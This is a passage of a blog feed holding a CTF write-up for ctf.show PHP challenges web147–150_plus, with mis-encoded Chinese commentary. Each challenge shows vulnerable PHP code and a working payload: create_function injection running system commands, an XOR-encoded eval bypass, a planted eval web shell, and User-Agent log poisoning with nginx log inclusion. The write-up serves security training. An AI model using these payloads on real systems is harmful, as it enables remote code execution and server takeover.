id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $ctfshow <span class="token operator">=</span> $_POST<span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>!preg_match<span class="token punctuation">(</span><span class="token string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span>$ctfshow<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        $ctfshow<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span>$_GET<span class="token punctuation">[</span><span class="token string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬é¢˜åˆæ˜¯ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼Œé¦–å…ˆéœ€è¦å…ˆçŸ¥é“çš„æ˜¯phpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚ æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯ å¾„ï¼› è€Œå¦‚æœå†™\function_name()è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚ å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ï¼›è€Œ\åˆšå¥½å¯ä»¥ç»•ç€æ­£åˆ™è¡¨è¾¾å¼ã€‚ç¬¬äºŒä¸ªéœ€è¦çŸ¥é“çš„æ˜¯create_function()å‡½æ•°ï¼Œå› ä¸ºåœ¨æœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬åªèƒ½æ§åˆ¶ç¬¬äºŒä¸ªå‚æ•°ï¼Œè€Œcreate_function()å‡½æ•°æ­£å¥½æ»¡è¶³</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">create_function<span class="token punctuation">(</span><span class="token string">'$A'</span><span class="token punctuation">,</span><span class="token string">'echo $A."147"'</span><span class="token punctuation">)</span><span class="token operator">//</span>ç­‰äºfunction f<span class="token punctuation">(</span>$a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  echo $A<span class="token punctuation">.</span><span class="token string">"147"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?show<span class="token operator">=</span><span class="token punctuation">&#125;</span>system<span class="token punctuation">(</span><span class="token string">"ls ."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span>post\create_function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªflag.phpæ–‡ä»¶ï¼Œç›´æ¥ç”¨catè¯»å–å³å¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?show<span class="token operator">=</span><span class="token punctuation">&#125;</span>system<span class="token punctuation">(</span><span class="token string">"cat flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span>post\create_function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å³é”®æŸ¥çœ‹æºä»£ç ï¼Œæ‹¿åˆ°flag</p><h4 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phpinclude <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $code<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&amp;\*\+\- ]+/"</span><span class="token punctuation">,</span>$code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token builtin">eval</span><span class="token punctuation">(</span>$code<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>function get_ctfshow_fl0g<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    echo file_get_contents<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬é¢˜ä¸­æ²¡æœ‰banå¼‚æˆ–^,æ‰€ä»¥å°±å¯ä»¥ç”¨å‰å‡ é¢˜çš„è„šæœ¬è·‘å‡ºpayload<br>payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?code<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"%08%02%08%09%05%0d"</span><span class="token operator">^</span><span class="token string">"%7b%7b%7b%7d%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%09%01%03%01%06%02"</span><span class="token operator">^</span><span class="token string">"%7d%60%60%21%60%28"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>$files <span class="token operator">=</span> scandir<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> foreach<span class="token punctuation">(</span>$files <span class="token keyword">as</span> $<span class="token builtin">file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_file<span class="token punctuation">(</span>$<span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token builtin">file</span> <span class="token operator">!=</span><span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            unlink<span class="token punctuation">(</span>$<span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>file_put_contents<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> $_POST<span class="token punctuation">[</span><span class="token string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$files <span class="token operator">=</span> scandir<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> foreach<span class="token punctuation">(</span>$files <span class="token keyword">as</span> $<span class="token builtin">file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_file<span class="token punctuation">(</span>$<span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token builtin">file</span> <span class="token operator">!=</span><span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            unlink<span class="token punctuation">(</span>$<span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>fil**<strong>e</strong></strong>_put_contents**    ( string <code>$filenam``e</code>   , <a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.pseudo-types.html#language.types.mixed">mixed</a> <code>$data</code>   [, int <code>$fla``g``s</code> = 0   [, resource <code>$context</code>  ]] ) : int<br><code>filename</code></p><p>è¦è¢«å†™å…¥æ•°æ®çš„æ–‡ä»¶åã€‚       </p><p><code>data</code></p><p>è¦å†™å…¥çš„æ•°æ®ã€‚ç±»å‹å¯ä»¥æ˜¯ <a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.types.string.html">string</a>ï¼Œ<a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.types.array.html">array</a>        æˆ–è€…æ˜¯ stream èµ„æºï¼ˆå¦‚ä¸Šé¢æ‰€è¯´çš„é‚£æ ·ï¼‰ã€‚    </p><p>å¦‚æœ <code>data</code>    æŒ‡å®šä¸º stream èµ„æºï¼Œè¿™é‡Œ stream    ä¸­æ‰€ä¿å­˜çš„ç¼“å­˜æ•°æ®å°†è¢«å†™å…¥åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ï¼Œè¿™ç§ç”¨æ³•å°±ç›¸ä¼¼äºä½¿ç”¨    <a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/function.stream-copy-to-stream.html">str</a><a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/function.stream-copy-to-stream.html">eam_copy_to_st</a><a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/function.stream-copy-to-stream.html">re</a><a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/function.stream-copy-to-stream.html">am</a><a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/function.stream-copy-to-stream.html">()</a> å‡½æ•°ã€‚       </p><p>å‚æ•° <code>data</code> å¯ä»¥æ˜¯æ•°ç»„ï¼ˆä½†ä¸èƒ½ä¸ºå¤šç»´æ•°ç»„ï¼‰ï¼Œè¿™å°±ç›¸å½“äº    <em>f<strong>i</strong>le_put_co<strong>nt</strong>ents($fi<strong>l</strong>ename, join*</em>(<strong>â€˜â€™, $array</strong>)**)*ã€‚Â </p><p>è¿™é‡Œçš„ä¸¤ä¸ªforå¾ªç¯ä¼šåˆ¤æ–­æ˜¯ä¸æ˜¯index.phpï¼Œå¦‚æœä¸æ˜¯åˆ™ä¼šè¢«åˆ é™¤ï¼Œä½†è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ ¹æ®file_get_content()å‡½æ•°ï¼Œæ¥ä¸Šä¼ ğŸï¼Œpayloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?ctf<span class="token operator">=</span>index<span class="token punctuation">.</span>phppostshow<span class="token operator">=</span><span class="token operator">&lt;</span>?php @<span class="token builtin">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> å†ç”¨èšå‰‘è¿æ¥<a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">h</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">t</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">tp://</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">8</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">8c</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">3c</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">995-2</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">f1c-4</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">3</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">b1-</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">96</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">e</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">8</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">-</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">5d2</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">66</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">8</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">3</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">70c07.challenge.ct</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">f</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">.show/?</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">c</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">tf=ind</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">e</a><a href="http://88c3c995-2f1c-43b1-96e8-5d2668370c07.challenge.ctf.show/?ctf=index.php">x.php</a>ï¼Œåœ¨æ ¹ç›®å½•æ‹¿åˆ°flag</p><h4 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phpinclude<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>error_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">CTFSHOW</span><span class="token punctuation">&#123;</span>    private $username<span class="token punctuation">;</span>    private $password<span class="token punctuation">;</span>    private $vip<span class="token punctuation">;</span>    private $secret<span class="token punctuation">;</span>    function __construct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        $this<span class="token operator">-</span><span class="token operator">></span>vip <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        $this<span class="token operator">-</span><span class="token operator">></span>secret <span class="token operator">=</span> $flag<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    function __destruct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        echo $this<span class="token operator">-</span><span class="token operator">></span>secret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    public function isVIP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> $this<span class="token operator">-</span><span class="token operator">></span>vip?TRUE<span class="token punctuation">:</span>FALSE<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    function __autoload<span class="token punctuation">(</span>$<span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$<span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            $<span class="token keyword">class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#è¿‡æ»¤å­—ç¬¦</span>$key <span class="token operator">=</span> $_SERVER<span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> $key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    die<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>$ctf <span class="token operator">=</span> $_POST<span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>extract<span class="token punctuation">(</span>$_GET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>class_exists<span class="token punctuation">(</span>$__CTFSHOW__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    echo <span class="token string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$isVIP <span class="token operator">&amp;</span><span class="token operator">&amp;</span> strrpos<span class="token punctuation">(</span>$ctf<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">=</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    include<span class="token punctuation">(</span>$ctf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆçœ‹åˆ°çš„æ˜¯å¯¹GETé‡Œçš„å˜é‡è¿›è¡Œäº†æ³¨å†Œï¼Œç„¶ååœ¨æœ€åä¸€ä¸ªifåˆ¤æ–­é‡Œä½¿ç”¨äº†åŒ…å«ï¼Œä½†ä¸èƒ½æœ‰:ï¼ŒåŒæ—¶è¦è¦†ç›–$isVIPå˜é‡ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨æ—¥å¿—åŒ…å«ä¸€å¥è¯æœ¨é©¬ï¼Œpayloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">å…ˆé€šè¿‡HEADERä¸­çš„user<span class="token operator">-</span>agentå‚æ•°ï¼Œå†™è¿›ä¸€å¥è¯æœ¨é©¬user<span class="token operator">-</span>agent<span class="token punctuation">:</span><span class="token operator">&lt;</span>?php <span class="token builtin">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>ç„¶åï¼š?isVIP<span class="token operator">=</span><span class="token number">1</span>postctf<span class="token operator">=</span><span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"tac f*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h4><?php<pre class="line-numbers language-python" data-language="python"><code class="language-python">include<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>error_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">CTFSHOW</span><span class="token punctuation">&#123;</span>    private $username<span class="token punctuation">;</span>    private $password<span class="token punctuation">;</span>    private $vip<span class="token punctuation">;</span>    private $secret<span class="token punctuation">;</span>    function __construct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        $this<span class="token operator">-</span><span class="token operator">></span>vip <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        $this<span class="token operator">-</span><span class="token operator">></span>secret <span class="token operator">=</span> $flag<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    function __destruct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        echo $this<span class="token operator">-</span><span class="token operator">></span>secret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    public function isVIP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> $this<span class="token operator">-</span><span class="token operator">></span>vip?TRUE<span class="token punctuation">:</span>FALSE<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    function __autoload<span class="token punctuation">(</span>$<span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$<span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            $<span class="token keyword">class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#è¿‡æ»¤å­—ç¬¦</span>$key <span class="token operator">=</span> $_SERVER<span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> $key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    die<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>$ctf <span class="token operator">=</span> $_POST<span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>extract<span class="token punctuation">(</span>$_GET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>class_exists<span class="token punctuation">(</span>$__CTFSHOW__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    echo <span class="token string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$isVIP <span class="token operator">&amp;</span><span class="token operator">&amp;</span> strrpos<span class="token punctuation">(</span>$ctf<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">=</span>FALSE <span class="token operator">&amp;</span><span class="token operator">&amp;</span> strrpos<span class="token punctuation">(</span>$ctf<span class="token punctuation">,</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">=</span>FALSE<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    include<span class="token punctuation">(</span>$ctf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>è¿™æ¬¡ä¹Ÿå°†logç»™è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¸èƒ½å†ç”¨æ—¥å¿—åŒ…å«äº†ï¼Œçœ‹äº†ç¾¤ä¸»çš„è§†é¢‘ï¼Œæ‰çŸ¥é“å¯ä»¥ç”¨.ç»•è¿‡ä¸‹åˆ’çº¿ï¼Œä½†åˆå› ä¸ºæ— æ³•è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œæ‰€ä»¥å°±å°†flagæ”¾åœ¨äº†phpinfoæ–‡ä»¶ä¸­ï¼Œpayloadï¼š<pre class="line-numbers language-python" data-language="python"><code class="language-python">?<span class="token punctuation">.</span><span class="token punctuation">.</span>CTFSHOW<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">=</span>phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>æ‹¿åˆ°flag]]></content>
      
      
      <categories>
          
          <category> ctf_show </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå…¥é—¨_phpç‰¹æ€§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms17_010æ¼æ´å¤ç°</title>
      <link href="/2022/03/06/ms17-010-fu-xian/"/>
      <url>/2022/03/06/ms17-010-fu-xian/</url>
      
